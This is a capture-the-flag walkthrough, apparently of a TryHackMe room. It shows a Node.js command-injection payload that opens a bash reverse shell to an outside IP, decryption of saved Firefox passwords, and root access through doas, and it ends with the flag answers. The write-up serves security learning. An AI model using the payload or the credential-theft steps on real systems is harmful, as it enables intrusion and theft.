# IP Address
10.10.139.157

# Enumeration
## Nmap 
```console
❯ nmap -sC -sV 10.10.139.157 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-25 19:13 IST
Nmap scan report for Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-25 19:13 IST
Nmap scan report for 10.10.139.157 
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds

```
## Gobuster
```console
❯ gobuster dir -u http://10.10.139.157/api -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,js,html,xml,png,jpg | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.139.157/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              png,jpg,php,js,html,xml
[+] Timeout:                 10s
===============================================================
2022/08/25 19:25:00 Starting gobuster in directory enumeration mode
===============================================================
/access               (Status: 200) [Size: 36]
/items                (Status: 200) [Size: 169]

```
## Website
**/**
```console
❯ curl  http://10.10.139.157/   
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>

```
**/api/access/**
```console
❯ curl  http://10.10.139.157/api/access
{"token":"dGhpc19pc19ub3RfcmVhbA=="}                                                                                         
```
The *token* is in encoded in base64 and on decoding found token to be `this_is_not_real` 
**/api/items/** 
```console
❯ curl  http://10.10.139.157/api/items
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}%                   
```
On using `Burpsuite` on this path with POST. Found that url uses some parameters.
On using wfuzz on the url to search for hidden parameters found that url takes `cmd` as a parameter
```console
❯ wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hh=45   http://10.10.139.157/api/items\?FUZZ\=oops
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.139.157/api/items?FUZZ=oops
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000002370:   500        10 L     64 W       1081 Ch     "cmd"                                                                                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 3246
Filtered Requests: 3245
Requests/sec.: 0
```
**Now with burpsuite uploaded payload to /api/items**
```console
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.17.39.205/1234+0>%261"') HTTP/1.1
```
# Reverse Shell
- Found user id in /home/user/user.txt
- Found a `.firefox` file in `/home/user/`
- Downloaded the file locally
- Decrypted the file [firefox_decrypt](https://github.com/unode/firefox_decrypt)
```console
❯ python3 firefox_decrypt.py .firefox
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
``` 
- Searched for SUID files 
```console
v0id@ubuntu:/home/user$ sudo -l
[sudo] password for v0id: 
Sorry, user v0id may not run sudo on ubuntu.
v0id@ubuntu:/home/user$ find / -type f -user root -perm -u=s 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas ------> Interesting
```
- Search gtfobins for doas vulnerabilities and and found a command for a root shell
- Escalted previlege and read the root.tx file
```console
v0id@ubuntu:/home/user$ doas -s
Password: 
root@ubuntu:/home/user# cat /root/root.txt
THM{diamonds_break_our_aching_minds}
```
# Answers
**token** - `this_is_not_real`
**user.txt** - `THM{i_don't_know_why}`
**root.txt** - `THM{diamonds_break_our_aching_minds}`
